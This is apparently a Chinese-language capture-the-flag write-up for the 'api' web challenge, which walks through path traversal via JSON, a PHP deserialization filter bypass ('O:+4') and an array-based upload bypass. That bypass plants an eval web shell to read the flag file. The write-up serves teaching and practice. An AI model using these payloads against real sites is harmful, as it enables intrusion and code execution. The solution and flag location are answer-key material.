# api

> 分类：Web（第三届广东省强网杯）

## 题目描述

PHP 反序列化 + 文件上传。通过 json 传递 filename 读取源码，反序列化读取文件，再上传 getshell。

## 考察知识点

- PHP 反序列化（O:+4 绕过过滤）
- JSON 传参
- 文件上传（数组绕过过滤）

## 解法

1. 访问 `/api/`，POST `filename` 参数，需 JSON 格式：`filename={"file":"../index.php"}`。
2. 读取 index.php，发现包含 hack.php，接收 flag 参数反序列化（有过滤）。
3. 读取 hack.php，readfile() 读取 $file 变量，注释提示读取 `fffffaa_not.php`。
4. 构造反序列化对象，用 `O:+4` 绕过 `O:` 过滤：

```
flag=O:+4:"hack":1:{s:4:"file";s:15:"fffffaa_not.php";}
```

5. fffffaa_not.php 可上传文件（jhh08881111jn 内容 + file_na 文件名），过滤 `<`，用数组绕过 `jhh08881111jn[]`：

```
/fffffaa_not.php?jhh08881111jn[]=<%3fphp+@eval($_POST[cmd])%3b%3f>&file_na=1234
```

6. 访问 uploads/1234.php，发现禁用了危险函数（system 等），但可用 `scandir()` 列目录 + `file_get_contents()` 读文件，发现 flag 在 `/f1ag_ahajjdhh11qwe`。

## 参考答案

（flag 通过 scandir + file_get_contents 读取 /f1ag_ahajjdhh11qwe）

## 来源

- 作者：TimeShatter | https://blog.csdn.net/qq_28205153/article/details/102899260
